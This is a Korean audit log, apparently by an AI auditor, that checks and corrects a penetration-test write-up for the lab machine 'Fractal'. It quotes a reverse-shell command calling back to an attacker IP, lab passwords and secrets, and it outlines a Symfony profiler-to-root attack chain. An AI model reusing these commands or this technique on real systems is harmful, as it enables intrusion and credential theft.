---
tags:
  - type/audit
  - platform/pg
---
# Fractal — 적대적 검증 + 정정 기록

- 대상: `03. PG\Fractal.md` (신규 작성, 274행 → 328행 → 342행)
- 감사일: 2026-08-21
- **사후 정정 2026-08-21** — 관리자 교차검증에서 삭제 1건(B-4 푸터 `Build with Symfony`)이 **오판으로 판명되어 복원.** 삭제 4건 → **3건**. 나머지 삭제 3건(B-1·B-2·B-3)은 산출물 재대조 결과 **전부 정당**으로 유지.
- **git baseline 없음** — 노트가 아직 untracked(`?? 03. PG/Fractal.md`)라 개작 전후 diff 대조 불가. 검증은 Kali 산출물·스크린샷·1차 사료로만 수행.

## 근거 출처

| 종류 | 경로 |
|---|---|
| Kali 산출물 | `~/PG/Fractal/` — `nmap-quick.txt`·`nmap-full.txt`·`nmap-udp-top100.txt`·`gobuster-80.txt`·`_SUMMARY.txt`·`recon-preflight.txt`·`.bg-fullscan.sh`·`sym/`(13)·`frag/`(14)·`web-80/`·`svc/`·`sign_fragment.py`·`rce.py`·`extract.py`·`ftp_upload.sh`·`sshdir/`·`harvest_root.txt`(69KB)·`proof_user.txt`·`proof_root.txt`·`cleanup.txt` |
| 스크린샷 | 볼트 `파일보관\PG-Fractal-index.png`(987431B = `shot_80_root.png`), `PG-Fractal-profiler-parameters.png`(44046B = `shot_80_profiler_params.png`) — 둘 다 **직접 열어** 본문과 대조. 일치 |
| 1차 사료 | `symfony/symfony` 3.4 브랜치 `src/Symfony/Bundle/WebProfilerBundle/Controller/ProfilerController.php` (raw.githubusercontent) |
| 직접 실행 | `printf '%s' 'ftppass123' \| openssl dgst -binary -md5 \| openssl base64` → `xKZnXxuuNbTj2DiMKnfv2A==` |
| 대조 | `~/.zsh_history` — 이 박스 관련 항목 **0건**(러너가 비대화형 `ssh kali "..."` 로 돌렸으므로 예상된 부재) |

---

## A. 고친 것

### A-1. §3 `shell_exec` 결과를 「200」으로 적음 — **틀림. 실제 500**

원문:
```
| `shell_exec&cmd=id` | **200 — `uid=33(www-data)`** |
```
`frag/shell_exec.html` 본문은 `LogicException ... HTTP 500 Internal Server Error`, 메시지가
`The controller must return a response (uid=33(www-data) gid=33(www-data) groups=33(www-data) given).`
**성공해도 500 이다.** 노트가 바로 다음 문장에서 「예외 메시지에 담아 반사」라고 옳게 설명하면서 표에는 200 을 적어 **내부 모순**까지 겹쳤다.

정정: 표를 「상태코드」가 아니라 「예외 클래스」 기준으로 재작성. `frag/exec.html`(`"$output" argument`)·`frag/system2.html`(`Parameter 2 to system() expected to be a reference`) 행 추가. 6장에 「500 을 실패로 읽을 뻔함」 항목 신설.

### A-2. §4 FTP 업로드를 `curl` 로 적음 — **실제로는 `lftp`**

원문:
```
curl -sv --ftp-create-dirs -T authorized_keys \
  "ftp://hacker:ftppass123@192.168.248.233/.ssh/authorized_keys"
  → 230 User hacker logged in ... 226 Transfer complete
```
반증 근거 셋:
1. `~/PG/Fractal/ftp_upload.sh` 실물이 **lftp** 를 쓴다(`mkdir .ssh` / `cd .ssh` / `put` / `chmod 600`).
2. `grep -rn curl ~/PG/Fractal/*.sh *.py` → `rce.py` 한 곳뿐. FTP 용 curl 호출 없음.
3. `grep -rn '230 User\|226 Transfer\|logged in' ~/PG/Fractal` → **0건.** 인용된 FTP 응답 라인이 산출물 어디에도 없다.

부재만이면 `근거부족` 이지만, 여기서는 **다른 도구를 쓴 산출물이 존재**하므로 적극 반증에 해당.

정정: `ftp_upload.sh` 전문을 출처와 함께 실음. 날조된 `230/226` 응답 줄은 **삭제**(위에 원문 인용으로 보존). 업로드 성공 근거는 `cleanup.txt` 의 정리 직전 리스팅 `-rw-r--r-- 1 benoit benoit 91 Aug 21 01:14 authorized_keys` (91B = `benoit_key.pub` 크기)로 교체. 「FTP 세션 로그 자체는 미보존」 명시.

### A-3. §4 benoit SSH 프롬프트 `benoit@fractal:$` — **창작**

`proof_user.txt` 의 실제 프롬프트는 **`$` 하나**다. `/etc/passwd` 가 `benoit:x:1000:1000::/home/benoit:/bin/sh` 이고 `harvest_root.txt` 프로세스 트리에 `benoit ... pts/3 Ss -sh` 가 있다 — dash 기본 PS1 이 `$ `. 호스트명이 붙은 프롬프트는 이 세션에 존재한 적이 없다.

정정: `proof_user.txt` 원문 블록을 그대로 싣고, 「`$` 하나인 이유는 로그인 셸이 `/bin/sh`」와 대화형 pty 근거(`sshd: benoit [priv]` → `sshd: benoit@pts/3` → `-sh`)를 산문으로 붙였다. **타겟 pty 프롬프트를 지운 것이 아니라, 없던 프롬프트를 실측으로 되돌린 것.**

### A-4. §3 egress 점검 순서가 산출물과 반대 — **내부 모순**

원문: 「리버스셸 발사 전 아웃바운드 egress 를 배치로 점검」
`frag/` mtime: `revshell443.html` 10:06:51 → `egress_test.html` 10:08:08 → `revshell80.html` 10:08:23.
**443 리버스셸이 먼저**고 egress 점검은 그 뒤다. 노트 6장은 이미 옳게 적고 있어(「첫 시도(443)에서 connect-back 안 옴 … 그 다음 점검」) 3장 ↔ 6장 모순이었다.

정정: 3장을 mtime 순서대로 고침.

### A-5. §3 「80·53 도착, 443 미도착」의 근거 등급 조정

`tcpdump`·리스너 화면이 **파일로 안 남았다**. 산출물로 확정되는 것은 **80 뿐** — `harvest_root.txt` 프로세스 목록에 `www-data 61971 bash -c bash -i >& /dev/tcp/192.168.45.207/80 0>&1` 가 살아 있다.

정정: 80 은 출처를 달아 확정, 53 도착·443 미도착은 `[가정]` 으로 강등하고 「관측 화면 미보존」을 명시. 6장에도 「다음부터는 tcpdump 출력도 리다이렉트할 것」으로 남김.

### A-6. §2 `_profiler/open?file=` 를 「임의 파일 열람」이라 단정 — **1차 사료로 반증**

Symfony 3.4 `ProfilerController::openAction`:
```php
$filename = $this->baseDir.\DIRECTORY_SEPARATOR.$file;
if (preg_match("'(^|[/\\\\])\.'", $file) || !is_readable($filename)) {
    throw new NotFoundHttpException(...);
}
```
`baseDir` 이 앞에 붙고 **점으로 시작하는 경로 세그먼트가 전부 거부**된다 → `../` 트래버설도 `.env` 류도 막힘. 「임의 파일」이 아니라 **프로젝트 루트 아래 일반 파일**이다. 이 박스에서 트래버설을 시도한 산출물도 없다.

정정: 라벨을 `← secret 회수` 로 바꾸고 가드 동작을 한 문장으로 설명 + 「트래버설 미시도」 명시. §8 방어 항목도 「가드만 믿지 말고 dev 진입점 자체를 없애라」로 인과를 고침.

### A-7. §4 benoit `sudo -l` 출력 블록 — `근거부족` 강등

`grep -rn NOPASSWD ~/PG/Fractal` → **0건**. `harvest_root.txt` 의 `===== SUDO =====` 절은 **root 로 실행한 것**이라 `User root may run ... (ALL : ALL) ALL` 이고 benoit 것이 아니다.

원문(보존):
```
User benoit may run the following commands on fractal:
    (ALL) NOPASSWD: ALL
```
**부재 증거이므로 삭제하지 않고 강등.** 사실 자체는 `proof_root.txt` 가 뒷받침한다 — `$ sudo -i` 가 **비밀번호 프롬프트 없이** 곧바로 `root@fractal:~#` 를 내줬다.

정정: 코드펜스를 걷고 「`sudo -l` 원문은 스크롤백에만 있었고 미보존 `[가정]`」 + 실측 근거는 `proof_root.txt` 라고 명시. 5장에 `proof_root.txt` 원문 블록을 새로 실었다.

### A-8. §1 nmap 명령이 실제 호출과 불일치

원문: `ssh kali@10.44.44.128 "nmap -sCV -p- -Pn -A --min-rate 5000 192.168.248.233"` (단일 명령)
실제(`nmap-quick.txt`·`nmap-full.txt` 헤더, `.bg-fullscan.sh`):
- `nmap --privileged -Pn -n -sCV -p 21,22,80 -oN nmap-quick.txt ...`
- `nmap -sCV -p- -Pn -n -A --min-rate 5000 -oN nmap-full.txt ...` (tmux 백그라운드)
- `sudo -n nmap -sU -Pn -n --top-ports 100 --max-retries 1 -T4 -oN nmap-udp-top100.txt ...`

정정: 3단 스캔으로 정확히 기록. 「추가 포트 없음」의 근거를 `Not shown: 64513 closed tcp ports (reset), 1019 filtered` 로 명시하고, UDP 는 **전부 `open|filtered (no-response)` 라 판정 불가**임을 적었다(원문은 「추가 포트 없음」에 뭉뚱그렸다).

### A-9. §1 Symfony 버전 2번째 근거 교체

원문: 「`composer.json` → `"symfony/symfony": "3.4.*"` (셸 획득 후 확인)」 — 산출물에 없음(`근거부족`).
**더 나은 실측이 산출물에 있었다**: `sym/app_dev.php__profiler_latest_panel_config.html` 프로파일러 Configuration 패널에 `Symfony version 3.4.46`.

정정: 근거를 `robots.txt` 주석 + 프로파일러 Configuration 패널(**3.4.46**)로 교체. 버전이 마이너까지 확정되어 오히려 강해졌다.

### A-10. §4 산문을 코드펜스에 넣음

```
/home/benoit  (uid 1000, /bin/sh) — local.txt 보유, 홈은 drwxr-xr-x benoit:benoit (타 사용자 쓰기 불가)
```
터미널 출력이 아니라 요약 문장인데 코드펜스에 들어 있었다(§3 「코드펜스는 실측의 표식」 위반).

정정: 산문으로 풀고 출처 표기(`frag/enum1.html` 의 `/home` 리스팅, `/etc/passwd` 행). 덧붙여 `harvest_root.txt` FLAGS 절이 `/home/benoit/local.txt` 를 `-r--r--r--` 로 보여주므로 **www-data 도 읽을 수 있었다**는 사실과, 그럼에도 benoit 셸이 필요했던 이유(웹셸 플래그 0점 규정)를 명시.

### A-11. §6 시행착오에 실패 산출물 4건 누락 — 보강

산출물에 있는데 노트가 안 다룬 것:
- `sym/_profiler.html`·`_profiler_latest.html` (471B 각) → **404**. prod 경로에는 프로파일러가 없음
- `sym/app_dev.php__configurator_.html` → `No route found for "GET /_configurator/"` 404
- `sym/config.php.html` (46B) → `This script is only accessible from localhost.` — **같은 웹루트에서 `config.php` 가드는 살아 있었다**
- `sym/phpmyadmin_.html` (14773B) → 실제 phpMyAdmin 로그인 페이지. 쓰지 않음

정정: 6장에 4건 추가. phpMyAdmin 은 **「배제」가 아니라 「필요 없어서 안 씀」**으로 구분해 적었다(`proftpd` DB 경로는 미시도).

### A-12. §1 gobuster 서술 정밀화

원문: 「gobuster 로 `/phpmyadmin/`, `/app.php`(→ 프로덕션 프론트) 확인」 + 「푸터 `Build with Symfony`」
`gobuster-80.txt` 실제: `/app.php (Status: 301) [--> http://192.168.248.233/]`, `/phpmyadmin (301)`, `/robots.txt (200)`. `web-80/probe-interesting.txt` 에 `/server-status 403`.

정정: 관측된 상태코드 그대로 기록.

⚠️ **푸터 삭제 부분은 오판이었다 — 아래 B-4 참조. 2026-08-21 복원됨.**
당초 감사자는 「푸터 문구는 `root.body` 에 `Symfony` 만 잡히고 「Build with Symfony」 전문은 확인되지 않아 삭제(스크린샷도 상단만 담겨 푸터 미포함)」라고 적었으나, **전문은 산출물 3개 파일에 그대로 있었다.** 스크린샷 미포함만 사실.

---

## B. 삭제한 것

| 원문 | 근거 |
|---|---|
| `→ 230 User hacker logged in ... 226 Transfer complete` | 산출물 0건 + 실제 도구는 lftp (A-2) |
| `benoit@fractal:$ id` 프롬프트 | `proof_user.txt` 의 실제 프롬프트는 `$` (A-3) |
| `` `composer.json` → `"symfony/symfony": "3.4.*"` (셸 획득 후 확인)`` | 산출물 부재 → 더 강한 실측(3.4.46)으로 교체 (A-9) |

`sudo -l` 블록은 **삭제하지 않고 강등**했다(A-7). 부재 증거의 상한은 `근거부족` 이므로.

### B-4 (철회) 「푸터 `Build with Symfony`」 — **오판. 관리자 교차검증에서 뒤집혀 복원함**

당초 판정: 「`root.body`·스크린샷에서 미확인 (A-12)」 → 삭제.
**틀렸다.** 전문이 산출물 3개 파일에 그대로 있다:

```
$ grep -ri 'Build with' ~/PG/Fractal/web-80/
/home/kali/PG/Fractal/web-80/root.body:          <p>Build with Symfony</p>
/home/kali/PG/Fractal/web-80/root-followed.body:          <p>Build with Symfony</p>
/home/kali/PG/Fractal/web-80/root.options:          <p>Build with Symfony</p>
```

`root.body` 46–50행이 `<footer class="mastfoot mt-auto">` → `<div class="inner">` → `<p>Build with Symfony</p>` 로, **문구가 실제로 푸터에 있다는 것까지** 마크업으로 확정된다. 원문 서술은 문구도 위치도 정확했다.

**왜 오판했나 — 다음 감사자를 위해.** 감사자가 `grep -o -i 'symfony...'` 류 **패턴 매칭 결과만 보고** `Symfony` 단독 히트를 「전문 미확인」으로 읽었다. 원본 파일을 열어 해당 행을 눈으로 보지 않았다. CLAUDE.md §3 「자동 도구가 뱉은 문자열은 원본에서 눈으로 재확인하라」의 정확한 실패 사례이고, `~/PG/` 부재를 근거로 정확했던 절을 날조 판정했다가 `~/.cache/pip/` 에서 나온 wheel 사건의 반복이다. **부분 히트를 부재 증거로 승격시키지 마라.**

**복원 조치**: `03. PG\Fractal.md` §1 「웹 진입점」에 푸터 서술 + `root.body` 46–50행 마크업 블록 + 출처 캡션으로 되살렸다.
**유지한 유보**: 「스크린샷에 푸터 미포함」은 **사실이다.** `파일보관\PG-Fractal-index.png` 를 직접 열어 확인 — 헤드리스 캡처 뷰포트가 1280×900 인데 본문에 전폭 이미지 3장이 있어 푸터가 접힘 아래로 밀렸다. 근거는 스크린샷이 아니라 응답 본문이라고 노트에 명시했다.

---

## C. 반증한 것 — 지적으로 올랐다가 **노트가 옳았던** 것

관리자가 지목한 7개 의심 항목 중 **3개가 오탐**이었다.

### C-1. 지목 ①「`proof_user.txt` mtime(10:18) > `proof_root.txt`(10:16) 이라 서사와 반대」 → **오탐. 노트가 맞다**

`ls` mtime 은 **로컬(KST)**, 파일 본문 `date` 는 **UTC** 다.
- `proof_user.txt` 본문 `Fri 21 Aug 2026 01:15:21 AM UTC` = **10:15:21 KST**
- `proof_root.txt` 본문 `Fri 21 Aug 2026 01:16:13 AM UTC` = **10:16:13 KST**

실제 획득 순서는 **user → root** 로 노트 서사와 일치한다. mtime 이 뒤집힌 것은 user 쪽 화면을 스크롤백에서 나중에 옮겨 적었기 때문이고, 「root 로 먼저 갔다」는 관리자 가설도 불필요하다. `harvest_root.txt` 의 `===== DATE =====` 가 `01:16:30 UTC` 인 것도 같은 축에 정합.
→ 노트를 고치지 않고, 대신 5장에 **이 함정을 명시**해 다음 독자가 같은 오독을 하지 않게 했다.

### C-2. 지목 ②「`proof_user.txt` 프롬프트가 `$` 뿐이라 대화형 셸 근거가 약하다 / 웹셸 의심」 → **오탐. 근거는 충분하다**

넷이 겹친다:
1. `/etc/passwd`: `benoit:x:1000:1000::/home/benoit:/bin/sh` — dash 기본 PS1 이 `$ ` 다. 호스트명이 **안 붙는 것이 정상**
2. `harvest_root.txt` 프로세스 트리: `root sshd: benoit [priv]` → `benoit sshd: benoit@pts/3` → `benoit ... pts/3 Ss -sh` — **pty 할당된 로그인 셸**
3. `proof_root.txt` 첫 줄이 `$ sudo -i` 이고 다음 줄이 `root@fractal:~#` — **같은 `$` 셸이 root pty 로 승격되는 장면이 한 파일에 이어져 있다.** 웹셸에서는 이 전이가 이렇게 찍히지 않는다
4. `sudo -i` 가 비밀번호 프롬프트 없이 통과 — 대화형 tty 가 아니면 `sudo` 가 `no tty present` 로 다르게 죽는다

→ 웹셸 의혹은 **기각**. 플래그 2개 모두 대화형 셸 획득으로 인정. 프롬프트 블록은 지우지 않고 오히려 `proof_*.txt` 원문을 더 실었다.
(2026-08-20 Fikklish 사고 — 감사자가 타겟 pty 프롬프트를 「위반」으로 보고 제거한 건 — 의 반대 방향으로 가지 않도록 특히 주의한 지점이다.)

### C-3. 지목 ⑤「DB 두 개가 별개라는 러너의 반증 보고가 새 창작일 수 있다」 → **오탐. 진짜 반증이다**

두 자격증명이 **서로 다른 산출물에서 각각 실측**된다:
- 앱 DB — `sym/app_dev.php__profiler_open_file_app_config_parameters.yml.html`: `database_name: symfony` / `database_user: symfony` / `database_password: symfony_db_password`
- ProFTPd DB — `frag/enum1.html`(`/etc/proftpd/sql.conf:10`): `SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password`

그리고 **권한상승에 실제로 쓴 쪽이 후자**임이 `cleanup.txt` 로 확정된다 — 정리 명령이 `mysql -uproftpd -pprotfpd_with_MYSQL_password proftpd -e "..."` 다. 노트의 「저장소 이원화」 서술은 정확하다. 원문 오타 `protfpd_...` 를 그대로 옮긴 것도 맞다.

### C-4. 지목 ④ 버전 주장 — **대부분 확인됨**

| 주장 | 판정 | 근거 |
|---|---|---|
| ProFTPd `1.3.6c-2ubuntu0.1` | ✅ 확인 | `harvest_root.txt` PKGS: `proftpd-basic`·`proftpd-doc`·`proftpd-mod-mysql` 전부 `1.3.6c-2ubuntu0.1` |
| Ubuntu 20.04.5 | ✅ 확인 | `PRETTY_NAME="Ubuntu 20.04.5 LTS"`, 커널 `5.4.0-126-generic` |
| Symfony 3.4 | ✅ 확인 + **3.4.46 으로 정밀화** | `robots.txt` 주석 + 프로파일러 Configuration 패널 |
| pkexec `0.105-26ubuntu1.3` | ✅ 확인 | `policykit-1 0.105-26ubuntu1.3` |
| ProFTPd 배너가 버전을 숨김 | ✅ 확인 | `nmap-quick.txt` `21/tcp open ftp ProFTPD` (버전 없음) |

**배너 ↔ 설치 버전 불일치는 이 박스에 없다** — 배너가 버전을 아예 안 내서 대조 대상이 없다. ClamAV 형 함정 아님. 노트의 「배너는 숨김, dpkg 로 확정」 서술이 정확하다.
`composer.json` 인용 한 건만 근거부족이었고 A-9 에서 더 강한 실측으로 교체했다.

### C-5. 지목 ③ 중 서명 계산 부분 — **일치**

`sign_fragment.py` 실물과 노트에 실린 코드가 변수명까지 일치. `rce.py` 의 이중 인코딩 설명(`parse_str` / `rawurlencode`)도 스크립트 주석과 일치. app secret `48a8538e6260789558f0dfe29861c05b` 은 `sym/...parameters.yml.html` **및 스크린샷 `PG-Fractal-profiler-parameters.png` 12행**에서 눈으로 확인.

`{md5}xKZnXxuuNbTj2DiMKnfv2A==` 도 Kali 에서 직접 실행해 재현 확인 — **정확**.
INSERT 결과도 `frag/db_insert.html` 에 `hacker 1000 1000 /home/benoit /bin/bash` 로 남아 있어 **실측**.

### C-6. 판정 보류 — 등급을 더 낮추지 않은 것

§3 의 tmux `fr-shell` capture-pane 블록:
```
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.233] 60850
www-data@fractal:/var/www/html/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
tmux 스크롤백은 **이미 소멸한 증거**라 대조 불가. 다만 `harvest_root.txt` 프로세스 트리가 `bash -c bash -i >& /dev/tcp/192.168.45.207/80 0>&1` → `bash -i` → `python3 -c import pty;pty.spawn("/bin/bash")` → `/bin/bash` (pts/1) 를 보여줘 **www-data pty 셸의 존재 자체는 확정**된다. 소스 포트 `60850` 만 검증 불가.
→ 표준의 「이미 소멸한 증거는 등급을 더 낮추지 말고 판정을 보류」에 따라 **그대로 둠.** 출처 캡션이 이미 정직하게 붙어 있다.

### C-7. 감사 중 내가 만든 오류 — 자기 정정 1건

A-2 정정을 쓰면서 「`set ftp:ssl-allow no` 를 빼면 lftp 가 AUTH TLS 인증서 검증에서 죽어 세션이 끊긴다」를 **확인 없이 단정으로 썼다.** 이 박스에서 그 옵션 없이 시도한 산출물이 없고, lftp 는 서버가 TLS 를 광고하지 않으면 평문으로 폴백한다. 표준의 「단정형 일반 지식은 때려보고 넣는다」 위반이라 **같은 세션에서 되돌려** 「필수였는지는 관측 없음」으로 고쳤다.

---

## D. 하지 않은 것 / 넘길 것

- **문체 이관 3건** — `pg-doc-reviewer` 관할. 손대지 않았다. (내가 추가한 문장도 기존 노트의 명사 종결형에 맞췄으나 완전하지는 않다.)
- **색인 갱신 필요** — 본문이 바뀌었으므로 `refresh.ps1` 대상. 공유 인프라라 **총괄 몫**(CLAUDE.md §5·§8). 감사자는 돌리지 않았다.
  - 프론트매터는 손대지 않음. `manual_tags: true` 의 `tech/*` 6개(`web/symfony`·`web/info-disclosure`·`web/rce`·`db/mysql`·`service/proftpd`·`priv/sudo`)는 **전부 실제 사용 기법**이라 그대로 둔다. `manual_cves: true` 이고 `cves:` 키가 없는데, 본문에서 CVE 번호를 하나도 단정하지 않으므로(「PwnKit」은 이름만 언급) **맞는 상태**다.
- **`_STATUS.md`** — 건드리지 않음. 판정: **Fractal 완료 2/2** (user `f62124f1ae5f1ab510a1a4a5de5bf0d5`, root `3fccb8b2b4eb6870d248850dbd7994ea`, 둘 다 대화형 셸 회수 확인).
- 박스 미접속. 플래그 미제출. `03. PG\` 의 다른 노트 미수정.

## E. 수치

| | |
|---|---|
| 노트 행수 | 274 → 328 → **342** (B-4 복원 반영) |
| 정정 | 12건 (A-1 ~ A-12) |
| 강등(`[가정]`·「관측 없음」) | 5건 (A-5 · A-6 · A-7 · A-8 UDP · lftp 옵션) |
| 삭제 | **3건** (B 표, 전문 인용 보존) — 당초 4건이었으나 B-4 가 오판으로 철회·복원 |
| 반증(지적이 틀렸던 것) | 3건 (C-1 · C-2 · C-3) + 부분 2건 (C-4 · C-5) + 자기 정정 1건 (C-7) |
| 지목 7개 중 실제 결함 | ③ 부분 · ⑥ · ⑦ = 4건 성립 / ① ② ⑤ = 3건 오탐 |
